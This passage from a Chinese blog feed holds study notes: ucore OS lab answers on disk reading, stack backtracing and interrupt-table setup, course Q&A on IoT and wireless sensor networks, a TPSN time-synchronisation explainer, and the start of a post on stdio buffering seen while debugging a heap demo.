class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* readsect - read a single sector at @secno into @dst */</span></span><br><span class="line"><span class="comment">// 读1号扇区</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> </span>&#123;</span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>);                         <span class="comment">// 要读的扇区数</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);      <span class="comment">//lba地址低8位</span></span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>); <span class="comment">//lba地址中8位</span></span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);  <span class="comment">//lba地址高8位（实际为高2位，最高6位恒为0）</span></span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);<span class="comment">//用来存放要读/写的磁盘号及磁头号，直接搬运的，具体资料没有查。</span></span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>);                      <span class="comment">// cmd 0x20 - read sectors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>readsect函数读取磁盘的一个扇区，readseg函数利用readsect将磁盘内容读取到内存。而bootmain利用readseg先读入内核文件头，判断其elf格式是否正确，接着读入后续内容到内存里，最后调用内核入口函数，启动内核。</p><h3 id="练习5"><a href="#练习5" class="headerlink" title="练习5"></a>练习5</h3><blockquote><p>实现函数调用堆栈跟踪函数 （需要编程）</p></blockquote><p>在lab1中完成kdebug.c中函数print_stackframe的实现，可以通过函数print_stackframe来跟踪函数调用堆栈中记录的返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> s_ebp = read_ebp(); <span class="comment">//利用现有方法获得ebp、eip</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_eip = read_eip();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//回溯20层栈空间</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;STACKFRAME_DEPTH;i++)&#123;</span><br><span class="line">        <span class="comment">//这里假设每层栈里的参数有四个</span></span><br><span class="line">       cprintf(<span class="string">"EBP=0x%08x\tEIP=0x%08x\targs="</span>,s_ebp,s_eip);</span><br><span class="line">       <span class="keyword">int</span> j;</span><br><span class="line">       <span class="keyword">uint32_t</span> *argv = (<span class="keyword">uint32_t</span> *)s_ebp + <span class="number">2</span>; <span class="comment">//越过栈中ebp和eip内容，访问栈中参数的部分</span></span><br><span class="line">       <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">          cprintf(<span class="string">"0x%08x "</span>,argv[j]);</span><br><span class="line">       &#125;</span><br><span class="line">       cprintf(<span class="string">"\n"</span>);</span><br><span class="line">       print_debuginfo(s_eip<span class="number">-1</span>);</span><br><span class="line">       s_eip = ((<span class="keyword">uint32_t</span> *)s_ebp)[<span class="number">1</span>]; <span class="comment">//the calling funciton's return addr eip  = ss:[ebp+4]</span></span><br><span class="line">       s_ebp = ((<span class="keyword">uint32_t</span> *)s_ebp)[<span class="number">0</span>]; <span class="comment">//the calling funciton's ebp = ss:[ebp]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>解释最后一行各个数值的含义</p></blockquote><p>这里的“最后一行”，指的是找不到对应符号信息的第一行，即</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EBP=0x00007bf8  EIP=0x00007d68  args=0xc031fcfa 0xc08ed88e 0x64e4d08e 0xfa7502a8</span><br><span class="line">    &lt;unknow&gt;: -- 0x00007d67 --</span><br><span class="line">EBP=0x00000000  EIP=0x00007c4f  args=0xf000e2c3 0xf000ff53 0xf000ff53 0xf000ff53</span><br><span class="line">    &lt;unknow&gt;: -- 0x00007c4e --</span><br></pre></td></tr></table></figure><p>这里注意到“最后一行”的下一行的EBP=0，说明EBP此时对应着系统启动后第一个函数调用的栈，即bootmain的ebp为0x7bf8。</p><h3 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h3><blockquote><p>完善中断初始化和处理 （需要编程）</p></blockquote><p>中断分为三类：</p><ol><li>异步中断（外中断）：外设引起。</li><li>同步中断（内中断、异常）：CPU遇到错误引起。</li><li>陷入中断（软中断）：软件请求系统调用引起。</li></ol><p>中断向量和中断服务例程的对应关系主要是由IDT（中断描述符表）负责。IDT本身的起始地址保存在idtr寄存器中，是一个8字节的数组，可以存储在内存任意位置，CPU把中断号乘8作为IDT索引。<br>指令LIDT和SIDT用来操作IDTR。两条指令都有一个显示的操作数：一个6字节表示的内存地址。指令的含义如下：</p><ul><li>LIDT（Load IDT Register）指令：使用一个包含线性地址基址和界限的内存操作数来加载IDT。操作系统创建IDT时需要执行它来设定IDT的起始地址。这条指令只能在特权级0执行。</li><li>SIDT（Store IDT Register）指令：拷贝IDTR的基址和界限部分到一个内存地址。这条指令可以在任意特权级执行。</li></ul><p>中断向量的寻址：CPU根据中断向量号，去IDT中找到对应的中断/陷阱表项，根据表项中的段选择子，去GDT/LDT中找到对应段描述符，再依此找到段基址，加上IDT表项中的段偏移，最终计算得到ISR的地址。</p><p>实验要求</p><ol><li>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</li><li>请编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init。在idt_init函数中，依次对所有中断入口进行初始化。使用mmu.h中的SETGATE宏，填充idt数组内容。每个中断的入口由tools/vectors.c生成，使用trap.c中声明的vectors数组即可。</li><li>请编程完善trap.c中的中断处理函数trap，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</li></ol><h4 id="1-6-1-amp-1-6-2"><a href="#1-6-1-amp-1-6-2" class="headerlink" title="1.6.1 &amp; 1.6.2"></a>1.6.1 &amp; 1.6.2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">uintptr_t</span> __vectors[];</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(idt)/<span class="keyword">sizeof</span>(struct gatedesc);i++)&#123;</span><br><span class="line">        SETGATE(idt[i],<span class="number">0</span>,GD_KTEXT,__vectors[i],DPL_KERNEL);</span><br><span class="line">    &#125;</span><br><span class="line">    SETGATE(idt[T_SWITCH_TOK],<span class="number">0</span>,GD_KTEXT,__vectors[T_SWITCH_TOK],DPL_USER);</span><br><span class="line">    lidt(&amp;idt_pd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习6做得有点潦草，理解中断的原理是一方面，但是做起来的感觉就完全不同了。<br>idt初始化函数中，首先要进行的是获取中断服务例程数组，该数组在vectors.S中被定义为<strong>vectors，因此在初始化IDT之前，先引入ISR数组`extern uintptr_t </strong>vectors[];`。<br>接下来是利用SETGATE宏，完成对idt[]的初始化，这里idt[]就是IDT。SETGATE宏可以完成对一个idt表项的设置，其定义位于mmu.h中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SETGATE(gate, istrap, sel, off, dpl) &#123;            \</span></span><br><span class="line">    (gate).gd_off_15_0 = (<span class="keyword">uint32_t</span>)(off) &amp; <span class="number">0xffff</span>;        \</span><br><span class="line">    (gate).gd_ss = (sel);                                \</span><br><span class="line">    (gate).gd_args = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_rsv1 = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_type = (istrap) ? STS_TG32 : STS_IG32;    \</span><br><span class="line">    (gate).gd_s = <span class="number">0</span>;                                    \</span><br><span class="line">    (gate).gd_dpl = (dpl);                                \</span><br><span class="line">    (gate).gd_p = <span class="number">1</span>;                                    \</span><br><span class="line">    (gate).gd_off_31_16 = (<span class="keyword">uint32_t</span>)(off) &gt;&gt; <span class="number">16</span>;        \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gatedesc结构体定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gatedesc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_15_0 : <span class="number">16</span>;        <span class="comment">// low 16 bits of offset in segment</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_ss : <span class="number">16</span>;            <span class="comment">// segment selector</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_args : <span class="number">5</span>;            <span class="comment">// # args, 0 for interrupt/trap gates</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_rsv1 : <span class="number">3</span>;            <span class="comment">// reserved(should be zero I guess)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_type : <span class="number">4</span>;            <span class="comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_s : <span class="number">1</span>;                <span class="comment">// must be 0 (system)</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_dpl : <span class="number">2</span>;            <span class="comment">// descriptor(meaning new) privilege level</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_p : <span class="number">1</span>;                <span class="comment">// Present</span></span><br><span class="line">    <span class="keyword">unsigned</span> gd_off_31_16 : <span class="number">16</span>;        <span class="comment">// high bits of offset in segment</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在SETGATE宏中，gate表示要处理的gatedesc结构体变量（就是IDT的单独一个表项），istrap表明这个表项是trap（exception）还是中断（interrupt），sel表示段选择子，off表示偏移，dpl表示特权级。<br>idt_init()中，GD_KTEXT表示存储了中断处理例程的代码段选择子。<br>通过循环完成初始化后，利用lidt()加载idt，完成初始化。</p><p>结合gatedesc的结构体定义来看，回答1.6.1：冒号后面的位数加起来就是结构体占用空间，共8字节。其中是gd_ss是段选择子，gd_off_15_0和gd_off_31_16共同组成偏移量，三者经过计算得到ISR入口地址。</p><h4 id="1-6-3"><a href="#1-6-3" class="headerlink" title="1.6.3"></a>1.6.3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">    ticks++;</span><br><span class="line">    <span class="keyword">if</span>(ticks%TICK_NUM==<span class="number">0</span>)&#123;</span><br><span class="line">        print_ticks();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>添加时钟中断处理代码，每100次tick打印一次信息。</p>]]></content>
      
      
      <categories>
          
          <category> 实验笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> os </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>物联网工程实践（随课时更新）</title>
      <link href="/2020/03/10/%E7%89%A9%E8%81%94%E7%BD%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%EF%BC%88%E9%9A%8F%E8%AF%BE%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/03/10/%E7%89%A9%E8%81%94%E7%BD%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%EF%BC%88%E9%9A%8F%E8%AF%BE%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这门课较为偏向硬件，而我们专业有很神奇地避开了大物这门课，加上本人数电基础实在是差，导致这门课一半的时间都听不下去。只好开个文章整理一下课上的知识点。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线传感器知识点（随课时更新）</title>
      <link href="/2020/03/09/%E6%97%A0%E7%BA%BF%E4%BC%A0%E6%84%9F%E5%99%A8%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E9%9A%8F%E8%AF%BE%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/03/09/%E6%97%A0%E7%BA%BF%E4%BC%A0%E6%84%9F%E5%99%A8%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E9%9A%8F%E8%AF%BE%E6%97%B6%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文记录在无线传感器网络课中，老师布置的作业的回答内容，回答主要基于课件，部分课件上没有标准回答的问题则采用了网上的主流回答。</p></blockquote><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol><li><p><strong>什么是无线传感器网络？</strong></p><ul><li>是大量的静止或移动的传感器以自组织和多跳的方式构成的无线网络，目的是协作地探测、处理和传输网络覆盖区域内感知对象的监测信息，并报告给用户。简称WSN。</li></ul></li><li><p><strong>什么是无线Ad Hoc网络？无线Ad Hoc网络的分类？</strong></p><ul><li>无基础设施网又称为无线Ad Hoc网络，其节点是分布式的，没有专门的固定基站。</li><li>无线Ad Hoc网络可分为两类，一类是移动Ad Hoc网络，它的终端是快速移动的；另一类就是无线传感器网络，它的节点是静止的或者移动很慢。</li></ul></li><li><p><strong>无线传感器网络的硬件平台包括哪些？</strong></p><ul><li>传感器节点</li><li>汇聚节点（又称基站、网关节点、Sink节点）</li><li>管理节点</li></ul></li><li><p><strong>无线传感器网络与现代信息技术之间的关系如何？</strong></p><ul><li>现代信息技术的三大基础技术为传感器技术、计算机技术、通信技术，无线传感器网络是对现代信息技术的基础技术的应用。</li></ul></li><li><p><strong>用图示说明无线传感器网络的系统架构。</strong><br><img src="/2020/03/09/无线传感器知识点（随课时更新）/1.png" alt="1"></p></li><li><p><strong>传感器网络节点使用的限制因素有哪些?</strong></p><ul><li>电源能量有限</li><li>通信能力有限</li><li>计算和存储能力有限</li></ul></li><li><p><strong>无线传感器网络传感器节点由哪几部分组成？各自的功能是什么？</strong></p><ul><li>由电源、感知部件、嵌入式处理器、存储器、通信部件和软件几部分构成。<ul><li>电源为传感器供应工作时消耗的能量</li><li>感知部件用于感知、获取外界信息，并将其转换为数字信号</li><li>嵌入式处理器负责协调节点各部分的工作</li><li>存储部件负责存储传感器节点收集处理信息、计算时需要的数据</li><li>通信部件负责传感器之间、传感器与用户之间的通信方式</li><li>软件为传感器提供必要的软件支持。</li></ul></li></ul></li><li><p><strong>分析传感器网络节点消耗电源能量的特征。</strong></p><ul><li>传感器节点消耗能量的模块包括传感器模块、处理器模块和无线通信模块。其中绝大部分能量消耗在无线通信模块。</li><li>无线通信的能量消耗与通信距离的关系为$E=kd^n$ 。其中k是系数，参数n满足关系$2&lt;n&lt;4$，n的取值与很多因素有关，通常取3。</li></ul></li><li><p><strong>无线传感器网络的关键性能指标有哪些？</strong></p><ul><li>网络的工作寿命</li><li>网络覆盖范围</li><li>网络搭建成本与难易程度</li><li>网络响应时间</li></ul></li><li><p><strong>无线传感器组网的特点？</strong></p><ul><li>大规模</li><li>自组织性</li><li>以数据为中心</li><li>应用相关性</li><li>动态性</li><li>可靠性</li></ul></li><li><p><strong>无线传感器网络主要应用在哪些领域？</strong></p><ul><li>军事</li><li>环境科学</li><li>医疗健康</li><li>空间探索</li><li>智能家居</li><li>建筑物和大型设备安全状态的监控</li><li>紧急援救</li></ul></li></ol><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><ol><li><strong>无线传感器网络的结构有哪几种？分类的依据是什么？</strong><ul><li>平面网络结构、分级网络结构、混合网络结构、Mesh网络结构</li><li>依据是无线传感器网络的适用场合</li></ul></li><li><strong>平面结构和分层结构的比较？</strong><br>分层结构是平面网络结构的一种扩展拓扑结构。</li><li><strong>分级网络结构有哪些特点？适用场合？</strong><ul><li>既有普通的节点，也有骨干节点（一个或多个）；</li><li>所有的通信量都要经过骨干节点；</li><li>骨干节点易引起拥塞和争用。</li><li>由于一些骨干节点的位置重要，易受到攻击，可能对整个网络的性能造成很大的影响。</li><li>适用场合：适合于民用，当用到军事上时，就要采取一些措施来尽量减少骨干节点被攻击的可能。例如，可以利用群首选择算法选择多个备用骨干节点，当原来的骨干节点受到攻击时，第二优先级的骨干节点可以代替原来那个继续执行骨干节点的功能。</li></ul></li><li><strong>基于Mesh网络结构的无线传感器特点？有哪些具体的应用？</strong><ul><li>节点通过电池供电；</li><li>数据和控制信号是通过无线通信的方式在网络上传输的；</li><li>网内每个节点至少可以和一个其他节点通信；</li><li>当节点打开电源时，可以自动加入网络，当节点离开网络时，其余节点可以自动重新建立通信路径；</li><li>支持多跳路由：来自一个节点的数据在其到达一个主机网关或控制器之前，可以通过多个其余节点转发。</li><li>应用：<ul><li>家庭应用，将消费类电子设备、家用电器连接起来。</li><li>企业应用，无线 Mesh 网络的多跳结构和配置灵活有利于网络拓扑结构的调整和升级。</li><li>学校应用，校园WLAN覆盖范围广，带宽要求高，并且需要解决教室、食堂、宿舍等人群密集处的网络拥塞问题，采用Mesh网络可以灵活调整网络结构，避免高密度装设AP。</li><li>医院应用，医院建筑结构复杂，对网络质量要求高，Mesh网络节点安装方便。</li><li>娱乐场所应用，Mesh 网络适合在地理位置偏远布线困难或经济上不合算，而又需要为用户提供宽带无线 Internet 访问的地方，如旅游场所、度假村、汽车旅馆等。</li><li>有快速部署要求的场合，如救灾现场、展会等需要临时搭建无线网络的地点。</li></ul></li></ul></li></ol><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><ol><li><strong>目前无线传感器网络的通信传输介质有哪些类型？它们各自有什么特点？</strong><ul><li>无线传感器网络的通信介质类型包括电磁波和声波</li><li>电磁波容易产生，可以传播很远，可以穿过障碍物，能向任意方向发送无线信号，所以发射方和接收方的装置在位置上都不必要求很精确的对准。声波一般仅用于水下无线通信。</li></ul></li><li><strong>无线网络通信系统为什么要进行调制和解调？调制有哪些方法？</strong><ul><li>基带信号往往不能作为传输信号，因而要将基带信号调制为相对基带频率而言频率非常高的带通信号，以便于进行信道传输，传输到达目的地后进行解调</li><li>信号调制常用的三种基本方法是调幅、调频和调相。</li></ul></li><li><strong>简述物理层的四个特性。</strong><ul><li>机械特性：规定了物理链接时使用的可接插连接器的形状和尺寸，连接器中的引脚数量和排列情况等。</li><li>电气特性：规定了在物理链接上传输二进制比特流时，线路上的信号的电平高低、阻抗以及阻抗匹配、传输速率与距离限制。</li><li>功能特性：规定了物理接口上各条信号线的功能分配和确切定义。物理接口信号线一般分为数据线、控制线、定时线和地线。</li><li>规程特性：它定义了信号线进行二进制比特流传输时的一组操作过程，包括各信号线的工作规则和时序。</li></ul></li><li><strong>在设计传感器网络物理层时，需要考虑哪些问题？</strong><ul><li>传输介质</li><li>物理层帧结构</li><li>物理层设计技术</li></ul></li><li><strong>网络层协议的基本思想是什么？</strong><ul><li>多数无线传感网络以数据为中心；</li><li>理想的无线传感网络采用基于属性的寻址和位置感知方式；</li><li>网络层的路由协议易于与其它网络(例如Internel)相结合。</li></ul></li><li><strong>什么是跨层设计?无线传感器网络为何采用跨层设计？</strong><ul><li>跨层设计是针对特定的分层结构而言的，一切不符合参考分层通信结构的协议设计称为跨层设计。</li><li>采用跨层设计的原因<ul><li>跨层设计除了包括各个协议层间的自适应问题，而且还包括了各个层之间相互协作和共享信息和资源，以便获取最佳性能准则</li><li>各个协议层之间相互依赖，彼此协作，目标就是尽系统所能，最大限度地满足用户应用的需求。</li></ul></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPSN协议学习</title>
      <link href="/2020/03/09/TPSN%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/09/TPSN%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因特网多使用NTP作为计算机时间同步化协议，但其使用依赖于因特网的几个特点：</p><ol><li>NTP很少考虑网络链路失效的情况</li><li>NTP考虑的网络结构相对稳定</li><li>NTP时间基准服务器的同步必须有基础设施的协助</li><li>NTP通过频繁校正、复杂计算来减小误差</li></ol><p>以上几个特点是无线传感器网络所难以满足的，因此无线传感器网络不适用NTP、GPS等常规的时间同步协议，故采用TPSN协议。</p><h2 id="TPSN协议概述"><a href="#TPSN协议概述" class="headerlink" title="TPSN协议概述"></a>TPSN协议概述</h2><ul><li>TPSN协议采用了层次型网络结构，类似NTP协议，目的是为传感器网络全网范围提供节点时间同步。</li><li>TPSN操作过程：分为两个阶段。<ul><li>第一阶段生成层次结构，每个节点具有一个级别。根节点为0级（最高级），其中第i级的节点要至少满足与(i-1)级节点间的通信。第一阶段最后生成一棵传感器节点树。</li><li>第二阶段为实现树节点的时间同步。按$1\rightarrow0,2\rightarrow1,…,i\rightarrow i-1 $的顺序完成整个网络的时间同步。</li></ul></li></ul><h2 id="TPSN相邻级别节点间同步机制"><a href="#TPSN相邻级别节点间同步机制" class="headerlink" title="TPSN相邻级别节点间同步机制"></a>TPSN相邻级别节点间同步机制</h2><ul><li>邻近级别的两个节点通过交换两个消息实现时间同步。</li><li><p>设S是i级节点，R是(i-1)级节点。$T_1$和$T_4$是S在两个不同时刻测量的时间。如下图所示：</p><p>  <img src="/2020/03/09/TPSN协议学习/1.png" alt="传输过程示例"></p></li></ul><p>解析：</p><ol><li>节点S在$T_1$时间发送SYNC分组给节点R，分组中包含了S的级别和时间$T_1$。传输时延为d。</li><li>节点R在$T_2$时间收到分组。$(1)\ T_2=T_1+d+\Delta$，其中$\Delta$为时间偏差。</li><li>节点R在$T_3$时刻发送ACK分组给节点S，分组中包含R的级别、$T_1$、$T_2$、$T_3$信息。</li><li>节点S在$T_4$时间收到应答，$(2)\ T_4=T_3+d-\Delta$</li><li>由$(1)$和$(2)$，解得</li></ol><p>$$<br>\begin{aligned}<br>    \Delta=\frac{(T_2-T_1)-(T_4-T_3)}{2}\\<br>    d=\frac{(T_2-T_1)+(T_4-T_3)}{2}<br>\end{aligned}<br>$$</p><p>解出$\Delta$和$d$后，S节点可以校正自己的时间。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>TPSN协议的同步过程很好理解，只是在上述解析过程中的几个时间点容易分辨不清$\Delta$的加减关系（(1)、(2)式），分辨的窍门是搞清协议的双方所扮演的角色：SYNC分组由被校正的节点发出，发向级别更高（级别编号更小）的节点，再根据高级节点返回的ACK分组校正自己的本地时间。</p><p>总的来说，TPSN协议就是由需要被校正的节点向比它更高级的节点提出校正，得到上级的回复后校正自己的时间。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn题中遇到的stdio缓冲区问题</title>
      <link href="/2020/03/09/pwn%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84stdio%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98/"/>
      <url>/2020/03/09/pwn%E9%A2%98%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84stdio%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在调试了how2heap的first_fit后，自己又写了一个first fit机制的demo想要动手调试一下，果然遇到了问题。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><img src="/2020/03/09/pwn题中遇到的stdio缓冲区问题/1.jpg" alt="问题"></p><p>图中12行是代码中第一次进行malloc，但是在12行执行结束后，查看堆块发现了下面的问题</p><p><img src="/2020/03/09/pwn题中遇到的stdio缓冲区问题/2.jpg" alt="问题"></p><p>可以看到，“一次”malloc之后出现了两个堆块，看到0x602000处的堆数据感觉到有些蹊跷，很明显其数据部分存储着一些字符串内容</p><p><img src="/2020/03/09/pwn题中遇到的stdio缓冲区问题/3.jpg" alt="问题"></p><p>这里发现这个堆块中存储的内容就是malloc前刚刚输出的内容，看到这里很明显这个多出来的堆块和printf有关，但是又说不太清楚问题，问了学弟后说是I/O缓冲问题。</p><p>于是开始寻找资料，这时候学弟又给了我一个链接（</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>Linux的I/O操作具有缓冲机制，使用stdio库进行写操作时，写数据会分别经过stdio、内核、磁盘的三重缓冲。</p><p>在stdio库函数进行对应的系统调用前，会首先与缓冲区进行交互：</p><pre><code>- 进行读操作时，首先试图从用户缓冲区读数据，如果缓冲区没有想要的数据，则进行系统调用，通过read把数据从内核缓冲区读取到用户缓冲区。- 进行写操作时，首先试图向用户缓冲区写，如果缓冲区已满则先进行fflush操作，将用户缓冲区数据写入内核缓冲区，然后再把写操作的数据写入用户缓冲区。- 附带介绍一下fflush，其定义为`int fflush(FILE *stream)`其常见用法如下(stdin、stdout、stderr对应的文件标识符分别为0、1、2)：  - `fflush(stdin)`：刷新stdin缓冲区，清除输入缓冲区。（标准中未定义此方法）  - `fflush(stdout)`：刷新stdout缓冲区，把缓冲区内容打印到标准输出设备。  - `fflush(stderr)`：刷新……不好意思这里不能刷新了，stderr没有缓冲区，因此也不存在`fflush(stderr)`的用法</code></pre><p>弄清了这部分，已经可以说明为什么first_fit使用<code>fprintf(stderr, &quot;...&quot;);</code>来输出了：stderr没有对应的缓冲区。</p><p>stdio缓冲有三种模式：</p><pre><code>1. `_IONBF`：不缓冲2. `_IOLBF`：行缓冲，遇到换行符或缓存满时执行实际的IO操作3. `_IOFBF`：全缓冲，缓存满时是执行实际的IO操作</code></pre><p>有三个stdio函数可以设置stdio的缓冲模式：</p><pre><code>1. `void setbuf(FILE *stream, char *buf);`：2. `void setbuffer(FILE *stream, char *buf, size_t size);`3. `int setvbuf(FILE *stream, char *buf, int mode, size_t size);`：mode可选项为`_IONBF`, `_IOLBF`, `_IOFBF`。</code></pre><p>查看glibc源码，其实现如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">setbuf (_IO_FILE *fp, <span class="keyword">char</span> *buf)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_setbuffer (fp, buf, _IO_BUFSIZ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setbuf实际就是setbuffer的包装（将buffer size设为了默认值）,其中<code>_IO_BUFSIZ</code>的默认值来自<code>#define _G_BUFSIZ 